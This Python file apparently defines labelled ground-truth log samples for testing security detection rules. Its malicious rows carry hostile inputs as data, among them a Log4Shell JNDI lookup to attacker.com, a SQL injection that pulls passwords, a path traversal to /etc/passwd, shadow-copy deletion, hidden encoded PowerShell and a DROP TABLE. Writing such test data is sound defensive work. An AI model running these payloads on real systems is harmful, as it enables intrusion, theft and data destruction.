"""Golden Datasets with verified Ground Truth for empirical security metrics and validation."""

from __future__ import annotations

from dataclasses import dataclass
from typing import Any


@dataclass
class GroundTruthSample:
    name: str
    headers: list[str]
    row: list[Any]
    expected_source: str
    is_threat: bool                                   # True if malicious or suspicious; False if benign
    expected_detection_id: str | None = None
    expected_mitre: str | None = None
    expected_disposition: str = "allow"


# 1. Windows Active Directory Golden Samples
WINDOWS_AD_GOLDEN_SAMPLES = [
    # Benign: Normal console interactive logon
    GroundTruthSample(
        name="Windows Normal Interactive Logon",
        headers=["Event ID", "TimeGenerated", "Account Name", "Logon Type", "Workstation Name"],
        row=["4624", "2026-09-03 08:30:00", "jdoe", "2", "WORKSTATION-10"],
        expected_source="windows_active_directory",
        is_threat=False,
    ),
    # Benign: Legitimate PowerShell command
    GroundTruthSample(
        name="Windows Normal Admin PowerShell",
        headers=["Event ID", "TimeGenerated", "Account Name", "CommandLine"],
        row=["4688", "2026-09-03 08:31:00", "admin", "powershell.exe -NoProfile Get-Service -Name W32Time"],
        expected_source="windows_active_directory",
        is_threat=False,
    ),
    # Malicious: Audit log cleared
    GroundTruthSample(
        name="Windows Audit Log Cleared (1102)",
        headers=["Event ID", "TimeGenerated", "Account Name", "Message"],
        row=["1102", "2026-09-03 09:00:00", "hacker", "The audit log was cleared"],
        expected_source="windows_active_directory",
        is_threat=True,
        expected_detection_id="DET-WIN-EVASION-001",
        expected_mitre="T1070.001",
    ),
    # Malicious: Encoded PowerShell Execution
    GroundTruthSample(
        name="Windows Encoded PowerShell Execution",
        headers=["Event ID", "TimeGenerated", "Account Name", "CommandLine"],
        row=["4688", "2026-09-03 09:05:00", "SYSTEM", "powershell.exe -nop -w hidden -encodedcommand SQBFAFgA..."],
        expected_source="windows_active_directory",
        is_threat=True,
        expected_detection_id="DET-WIN-EXEC-001",
        expected_mitre="T1059.001",
    ),
    # Malicious: Ransomware Shadow Copy Invalidation
    GroundTruthSample(
        name="Windows Volume Shadow Copy Deletion",
        headers=["Event ID", "TimeGenerated", "Account Name", "CommandLine"],
        row=["4688", "2026-09-03 09:10:00", "SYSTEM", "vssadmin.exe delete shadows /all /quiet"],
        expected_source="windows_active_directory",
        is_threat=True,
        expected_detection_id="DET-WIN-RANSOM-001",
        expected_mitre="T1490",
    ),
    # Suspicious: User account locked out
    GroundTruthSample(
        name="Windows Account Locked Out (4740)",
        headers=["Event ID", "TimeGenerated", "TargetUserName", "Message"],
        row=["4740", "2026-09-03 09:15:00", "ceo_account", "A user account was locked out"],
        expected_source="windows_active_directory",
        is_threat=True,
        expected_detection_id="DET-WIN-ACCT-003",
        expected_mitre="T1110",
    ),
]

# 2. Network & Firewall Golden Samples
NETWORK_FIREWALL_GOLDEN_SAMPLES = [
    # Benign: Normal outbound HTTPS traffic allowed
    GroundTruthSample(
        name="Firewall Normal HTTPS Traffic",
        headers=["Time", "Source Zone", "Destination Zone", "Source IP", "Destination IP", "Action", "Transmission Protocol", "Destination Port"],
        row=["2026-09-03 10:00:00", "trust", "untrust", "10.0.0.15", "142.250.180.14", "Permit", "TCP", "443"],
        expected_source="firewall_utm",
        is_threat=False,
    ),
    # Benign: Normal corporate DNS query
    GroundTruthSample(
        name="Firewall Normal DNS Query",
        headers=["Time", "Source Zone", "Destination Zone", "Source IP", "Destination IP", "Action", "Transmission Protocol", "Destination Port"],
        row=["2026-09-03 10:00:01", "trust", "untrust", "10.0.0.15", "8.8.8.8", "Permit", "UDP", "53"],
        expected_source="firewall_utm",
        is_threat=False,
    ),
    # Malicious: ICMP Unreachable DoS Attack
    GroundTruthSample(
        name="Firewall ICMP Unreachable Flood",
        headers=["Time", "Device", "Source IP", "Destination IP", "Attack Name", "Action", "Transmission Protocol", "Message"],
        row=["2026-09-03 10:05:00", "10.47.15.5", "185.80.143.10", "10.225.138.198", "Attack", "discard", "ICMP", 'AttackType="ICMP unreachable attack"'],
        expected_source="firewall_utm",
        is_threat=True,
        expected_detection_id="DET-NET-DOS-001",
        expected_mitre="T1498.001",
    ),
    # Malicious: IP Spoofing Attack
    GroundTruthSample(
        name="Firewall IP Spoof Attack",
        headers=["Time", "Device", "Source IP", "Destination IP", "Attack Name", "Action", "Transmission Protocol", "Message"],
        row=["2026-09-03 10:06:00", "10.47.15.5", "10.47.10.46", "10.170.0.48", "Attack", "discard", "UDP", 'AttackType="IP spoof attack"'],
        expected_source="firewall_utm",
        is_threat=True,
        expected_detection_id="DET-NET-SPOOF-001",
        expected_mitre="T1036",
    ),
    # Malicious: Zerotier P2P Tunneling
    GroundTruthSample(
        name="Firewall Zerotier Tunnel",
        headers=["Time", "Device", "Source IP", "Destination IP", "Action", "Message"],
        row=["2026-09-03 10:10:00", "10.0.0.1", "10.200.1.5", "198.51.100.20", "block", "zerotier encrypted mesh p2p tunnel detected"],
        expected_source="firewall_utm",
        is_threat=True,
        expected_detection_id="DET-NET-P2P-001",
        expected_mitre="T1572",
    ),
]

# 3. Linux / SSH Golden Samples
LINUX_SSH_GOLDEN_SAMPLES = [
    # Benign: Legitimate SSH key login
    GroundTruthSample(
        name="Linux Accepted SSH Key",
        headers=["timestamp", "hostname", "process_name", "message", "action"],
        row=["Sep 3 11:00:00", "web01", "sshd", "Accepted publickey for deployer from 192.168.1.50 port 54112 ssh2", "allow"],
        expected_source="linux_syslog",
        is_threat=False,
    ),
    # Malicious: SSH User Enumeration & Failed Password
    GroundTruthSample(
        name="Linux SSH Invalid User Brute Force",
        headers=["timestamp", "hostname", "process_name", "message", "action"],
        row=["Sep 3 11:05:00", "web01", "sshd", "Failed password for invalid user admin from 203.0.113.199 port 41232 ssh2", "block"],
        expected_source="linux_syslog",
        is_threat=True,
        expected_detection_id="DET-LNX-AUTH-002",
        expected_mitre="T1110.001",
    ),
    # Suspicious: Sudo authorization failure
    GroundTruthSample(
        name="Linux Sudo Not in Sudoers",
        headers=["timestamp", "hostname", "process_name", "message", "action"],
        row=["Sep 3 11:10:00", "web01", "sudo", "guest : user NOT in sudoers ; TTY=pts/1 ; COMMAND=/usr/bin/cat /etc/shadow", "deny"],
        expected_source="linux_syslog",
        is_threat=True,
        expected_detection_id="DET-LNX-SUDO-001",
        expected_mitre="T1548.003",
    ),
]

# 4. Web & WAF Golden Samples
WEB_WAF_GOLDEN_SAMPLES = [
    # Benign: Standard HTTP GET
    GroundTruthSample(
        name="Web Benign Page Request",
        headers=["cs-uri-stem", "cs-method", "sc-status", "c-ip", "User-Agent"],
        row=["/products/details", "GET", "200", "192.168.10.20", "Mozilla/5.0 (Windows NT 10.0)"],
        expected_source="web_waf",
        is_threat=False,
    ),
    # Malicious: Log4Shell RCE Attempt
    GroundTruthSample(
        name="Web Log4Shell Exploit",
        headers=["cs-uri-stem", "cs-method", "sc-status", "c-ip", "User-Agent"],
        row=["/login", "POST", "400", "45.33.32.156", "${jndi:ldap://attacker.com/exploit}"],
        expected_source="web_waf",
        is_threat=True,
        expected_detection_id="DET-WEB-LOG4J-001",
        expected_mitre="T1190",
    ),
    # Malicious: SQL Injection Union Select
    GroundTruthSample(
        name="Web SQL Injection Attack",
        headers=["cs-uri-stem", "cs-method", "sc-status", "c-ip", "Message"],
        row=["/search", "GET", "500", "185.220.101.5", "query: 1' UNION SELECT null, username, password FROM users--"],
        expected_source="web_waf",
        is_threat=True,
        expected_detection_id="DET-WEB-SQLI-001",
        expected_mitre="T1190",
    ),
    # Malicious: Path Traversal
    GroundTruthSample(
        name="Web Path Traversal /etc/passwd",
        headers=["cs-uri-stem", "cs-method", "sc-status", "c-ip", "Message"],
        row=["/view_document", "GET", "403", "198.51.100.77", "file=../../../../etc/passwd"],
        expected_source="web_waf",
        is_threat=True,
        expected_detection_id="DET-WEB-TRAVERSAL-001",
        expected_mitre="T1083",
    ),
]

# 5. Cloud & Identity Golden Samples
CLOUD_IDENTITY_GOLDEN_SAMPLES = [
    # Benign: Normal corporate Office 365 logon
    GroundTruthSample(
        name="Cloud Normal M365 Logon",
        headers=["Workload", "Operation", "UserId", "ClientIPAddress"],
        row=["AzureActiveDirectory", "UserLoggedIn", "employee@company.com", "192.168.1.1"],
        expected_source="cloud_identity",
        is_threat=False,
    ),
    # Suspicious: Impossible Travel Alert
    GroundTruthSample(
        name="Cloud Impossible Travel Alert",
        headers=["Workload", "Operation", "UserId", "ClientIPAddress", "Message"],
        row=["AzureActiveDirectory", "UserLoggedIn", "cfo@company.com", "203.0.113.1", "Impossible travel alert: user logged in from London and Tokyo in 10 minutes"],
        expected_source="cloud_identity",
        is_threat=True,
        expected_detection_id="DET-CLD-TRAVEL-001",
        expected_mitre="T1078.004",
    ),
    # Malicious: BEC Mailbox Forwarding Rule
    GroundTruthSample(
        name="Cloud BEC Mailbox Forwarding",
        headers=["Workload", "Operation", "UserId", "Message"],
        row=["Exchange", "New-InboxRule", "finance@company.com", "New-InboxRule -ForwardTo badguy@external.com"],
        expected_source="cloud_identity",
        is_threat=True,
        expected_detection_id="DET-CLD-BEC-001",
        expected_mitre="T1114.003",
    ),
]

# 6. Database Golden Samples
DATABASE_GOLDEN_SAMPLES = [
    # Benign: Normal SELECT query
    GroundTruthSample(
        name="Database Normal SELECT Query",
        headers=["Database Name", "DB User", "SQL Statement"],
        row=["ProductionDB", "app_user", "SELECT id, name FROM employees WHERE status = 'active'"],
        expected_source="database_audit",
        is_threat=False,
    ),
    # Malicious: Destructive DROP TABLE Query
    GroundTruthSample(
        name="Database Destructive DROP TABLE",
        headers=["Database Name", "DB User", "SQL Statement"],
        row=["ProductionDB", "intruder", "DROP TABLE financial_records_2026"],
        expected_source="database_audit",
        is_threat=True,
        expected_detection_id="DET-DB-DDL-001",
        expected_mitre="T1485",
    ),
    # Suspicious: Database Authentication Failure
    GroundTruthSample(
        name="Database MSSQL Error 18456",
        headers=["Database Name", "DB User", "Message"],
        row=["ProductionDB", "sa", "Login failed for user 'sa'. Reason: Error: 18456 Severity: 14 State: 8."],
        expected_source="database_audit",
        is_threat=True,
        expected_detection_id="DET-DB-AUTH-001",
        expected_mitre="T1110",
    ),
]

# 7. EDR & Malware Golden Samples
EDR_GOLDEN_SAMPLES = [
    # Benign: Clean process running
    GroundTruthSample(
        name="EDR Clean Process Execution",
        headers=["Device", "Process Name", "Hash", "Action"],
        row=["DESKTOP-01", "notepad.exe", "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", "allow"],
        expected_source="generic",
        is_threat=False,
    ),
    # Malicious: Virus Expiro Signature
    GroundTruthSample(
        name="EDR Virus Expiro Infection",
        headers=["Device", "Source IP", "Destination IP", "Attack Name", "Action", "Message"],
        row=["10.47.15.5", "10.221.118.180", "114.114.114.114", "Virus", "Block", 'SignName="Virus Expiro : evilc2.biz"'],
        expected_source="firewall_utm",
        is_threat=True,
        expected_detection_id="DET-EDR-EXPIRO-001",
        expected_mitre="T1204",
    ),
    # Malicious: Trojan Tiggre Signature
    GroundTruthSample(
        name="EDR Trojan Tiggre Signature",
        headers=["Device", "Source IP", "Destination IP", "Attack Name", "Action", "Message"],
        row=["10.47.15.5", "10.48.11.76", "82.114.163.31", "Trojan", "Block", 'SignName="Trojan Tiggre : malware.biz"'],
        expected_source="firewall_utm",
        is_threat=True,
        expected_detection_id="DET-EDR-TIGGRE-001",
        expected_mitre="T1059",
    ),
    # Malicious: Cryptocurrency CoinMiner
    GroundTruthSample(
        name="EDR Cryptocurrency CoinMiner",
        headers=["Device", "Source IP", "Destination IP", "Attack Name", "Action", "Message"],
        row=["10.47.15.5", "10.248.102.215", "82.114.163.31", "Trojan", "Block", 'SignName="Trojan CoinMiner : pool.minexmr.com"'],
        expected_source="firewall_utm",
        is_threat=True,
        expected_detection_id="DET-EDR-MINER-001",
        expected_mitre="T1496",
    ),
]

# 8. Unknown / Partial Analysis Samples
UNKNOWN_PARTIAL_SAMPLES = [
    # Custom non-standard log without security headers
    GroundTruthSample(
        name="Custom Non-standard CSV",
        headers=["colA", "colB", "colC"],
        row=["data1", "data2", "data3"],
        expected_source="unknown_generic",
        is_threat=False,
    ),
    # Custom log with IP and action only
    GroundTruthSample(
        name="Partial Minimal Network Log",
        headers=["client_ip", "status", "info"],
        row=["192.168.1.50", "blocked", "connection terminated"],
        expected_source="unknown_generic",
        is_threat=False,
    ),
]

ALL_GOLDEN_SAMPLES = (
    WINDOWS_AD_GOLDEN_SAMPLES
    + NETWORK_FIREWALL_GOLDEN_SAMPLES
    + LINUX_SSH_GOLDEN_SAMPLES
    + WEB_WAF_GOLDEN_SAMPLES
    + CLOUD_IDENTITY_GOLDEN_SAMPLES
    + DATABASE_GOLDEN_SAMPLES
    + EDR_GOLDEN_SAMPLES
    + UNKNOWN_PARTIAL_SAMPLES
)
